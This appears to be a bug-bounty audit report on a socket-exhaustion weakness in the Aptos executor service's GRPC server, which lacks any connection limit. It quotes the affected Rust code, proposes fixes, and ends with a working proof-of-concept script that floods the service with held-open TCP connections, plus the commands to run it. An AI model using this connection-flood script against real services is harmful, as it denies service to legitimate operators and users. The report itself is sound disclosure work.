# Audit Report

## Title
Socket Exhaustion Vulnerability in Executor Service GRPC Server Allows Denial of Service

## Summary
The `ProcessExecutorService` creates a GRPC server without connection limits, authentication, or rate limiting, allowing an attacker to exhaust file descriptors through repeated connection attempts and prevent legitimate communication between shards.

## Finding Description

The executor service's network layer violates the **Resource Limits** invariant (Invariant #9: "All operations must respect gas, storage, and computational limits") by failing to limit TCP connections.

When `ProcessExecutorService::new()` is called, it creates a `NetworkController` which starts a GRPC server to handle incoming connections from the coordinator and other shards. [1](#0-0) 

The `NetworkController` initializes an inbound handler with only a timeout parameter, but no connection limits. [2](#0-1) 

The underlying GRPC server is created with only a request timeout configuration, lacking any connection limit controls. [3](#0-2) 

**Attack Path:**
1. Attacker identifies the executor service's listening address (passed via command-line arguments)
2. Attacker opens numerous TCP connections (e.g., 1000+) to the service endpoint
3. Each connection consumes a file descriptor from the process
4. Once the process file descriptor limit is reached (typically 1024 by default on Linux), legitimate connections from the coordinator and peer shards are rejected
5. The sharded execution system fails, unable to process transactions

There is no authentication, authorization, connection pooling, or rate limiting to prevent this attack. The only configured protection is a per-request timeout, which does not limit connection establishment or lifetime. [4](#0-3) 

## Impact Explanation

This vulnerability qualifies as **Medium to High** severity per the Aptos bug bounty program:

- **High Severity** - "Validator node slowdowns": The executor shard becomes unable to accept legitimate connections, causing transaction processing delays
- **High Severity** - "Significant protocol violations": Breaks the sharded execution protocol, preventing distributed transaction execution
- **Medium Severity** - "State inconsistencies requiring intervention": Failed shards may cause incomplete transaction execution requiring manual intervention

The impact is somewhat limited because:
- It only affects sharded execution mode (not single-node execution)
- Requires network access to the executor service endpoint
- Does not cause permanent data loss or fund theft
- Can be mitigated by external firewalls or network policies

However, in production deployments without proper network isolation, this could cause significant operational disruption.

## Likelihood Explanation

**Likelihood: Medium to High**

This vulnerability is likely to be exploited because:
1. **Low Attack Complexity**: Simple TCP connection flood requires minimal attacker sophistication
2. **No Authentication Required**: Any client with network access can connect
3. **Predictable Impact**: File descriptor exhaustion is deterministic and observable
4. **Public Endpoint Risk**: If executor services are exposed without proper network segmentation

Mitigating factors:
- Executor services may be deployed behind firewalls or in isolated networks
- Some deployments may have OS-level file descriptor limits raised
- Network monitoring could detect connection flooding

## Recommendation

Implement the following protections in the `NetworkController`:

1. **Add Connection Limits**: Configure tonic's `concurrency_limit_per_connection()` and implement a maximum concurrent connections limit:

```rust
// In grpc_network_service/mod.rs, modify start_async():
const MAX_CONCURRENT_CONNECTIONS: usize = 100;

Server::builder()
    .timeout(std::time::Duration::from_millis(rpc_timeout_ms))
    .concurrency_limit_per_connection(256)
    .tcp_keepalive(Some(std::time::Duration::from_secs(60)))
    .add_service(/* ... */)
    // Add connection limiting layer before serve_with_shutdown
```

2. **Implement Connection Tracking**: Add a connection counter to reject connections exceeding the limit:

```rust
// Track active connections in InboundHandler
pub struct InboundHandler {
    // ... existing fields ...
    active_connections: Arc<AtomicUsize>,
    max_connections: usize,
}

// In the GRPC service handler, increment/decrement counter
// Reject connections when limit is reached
```

3. **Add Rate Limiting**: Implement per-IP connection rate limiting to prevent rapid connection attempts

4. **Add Authentication**: Implement mutual TLS or token-based authentication to restrict access to authorized coordinators and shards

5. **Network Isolation**: Deploy executor services in isolated networks accessible only to the coordinator

## Proof of Concept

```rust
// File: exploit_socket_exhaustion.rs
// Demonstrates socket exhaustion attack on executor service

use std::net::TcpStream;
use std::time::Duration;
use std::thread;

fn main() {
    let target = "127.0.0.1:8080"; // Executor service address
    let mut connections = Vec::new();
    
    println!("[*] Starting socket exhaustion attack on {}", target);
    
    for i in 0..2000 {
        match TcpStream::connect_timeout(
            &target.parse().unwrap(),
            Duration::from_secs(5)
        ) {
            Ok(stream) => {
                // Keep connection alive
                connections.push(stream);
                if i % 100 == 0 {
                    println!("[+] Opened {} connections", i);
                }
            },
            Err(e) => {
                println!("[!] Connection failed at {}: {}", i, e);
                println!("[*] File descriptors likely exhausted");
                break;
            }
        }
        
        // Small delay to avoid overwhelming the network
        thread::sleep(Duration::from_millis(10));
    }
    
    println!("[*] Holding {} connections open", connections.len());
    println!("[*] Legitimate connections will now fail");
    
    // Hold connections open
    thread::sleep(Duration::from_secs(300));
}
```

To test:
1. Start an executor service: `cargo run --bin aptos-executor-service -- --shard-id 0 --num-shards 2 --coordinator-address 127.0.0.1:9000 --remote-executor-addresses 127.0.0.1:8080 127.0.0.1:8081`
2. Run the exploit: `cargo run --bin exploit_socket_exhaustion`
3. Observe connection failures in legitimate clients attempting to connect to the executor service
4. Monitor file descriptors: `lsof -p <executor_pid> | wc -l`

## Notes

This vulnerability is specific to the **executor service's network controller** implementation in `secure/net/`, which is separate from the main Aptos network layer in `network/framework/`. The main network layer has connection limits (`MAX_INBOUND_CONNECTIONS = 100`), but the executor service does not inherit these protections. [5](#0-4)

### Citations

**File:** execution/executor-service/src/process_executor_service.rs (L35-43)
```rust
        let mut executor_service = ExecutorService::new(
            shard_id,
            num_shards,
            num_threads,
            self_address,
            coordinator_address,
            remote_shard_addresses,
        );
        executor_service.start();
```

**File:** execution/executor-service/src/remote_executor_service.rs (L30-31)
```rust
        let service_name = format!("executor_service-{}", shard_id);
        let mut controller = NetworkController::new(service_name, self_address, 5000);
```

**File:** secure/net/src/grpc_network_service/mod.rs (L75-86)
```rust
        Server::builder()
            .timeout(std::time::Duration::from_millis(rpc_timeout_ms))
            .add_service(
                NetworkMessageServiceServer::new(self).max_decoding_message_size(MAX_MESSAGE_SIZE),
            )
            .add_service(reflection_service)
            .serve_with_shutdown(server_addr, async {
                server_shutdown_rx.await.ok();
                info!("Received signal to shutdown server at {:?}", server_addr);
            })
            .await
            .unwrap();
```

**File:** secure/net/src/network_controller/mod.rs (L84-92)
```rust
pub struct NetworkController {
    inbound_handler: Arc<Mutex<InboundHandler>>,
    outbound_handler: OutboundHandler,
    inbound_rpc_runtime: Runtime,
    outbound_rpc_runtime: Runtime,
    inbound_server_shutdown_tx: Option<oneshot::Sender<()>>,
    outbound_task_shutdown_tx: Option<Sender<Message>>,
    listen_addr: SocketAddr,
}
```

**File:** secure/net/src/network_controller/mod.rs (L95-113)
```rust
    pub fn new(service: String, listen_addr: SocketAddr, timeout_ms: u64) -> Self {
        let inbound_handler = Arc::new(Mutex::new(InboundHandler::new(
            service.clone(),
            listen_addr,
            timeout_ms,
        )));
        let outbound_handler = OutboundHandler::new(service, listen_addr, inbound_handler.clone());
        info!("Network controller created for node {}", listen_addr);
        Self {
            inbound_handler,
            outbound_handler,
            inbound_rpc_runtime: Runtime::new().unwrap(),
            outbound_rpc_runtime: Runtime::new().unwrap(),
            // we initialize the shutdown handles when we start the network controller
            inbound_server_shutdown_tx: None,
            outbound_task_shutdown_tx: None,
            listen_addr,
        }
    }
```
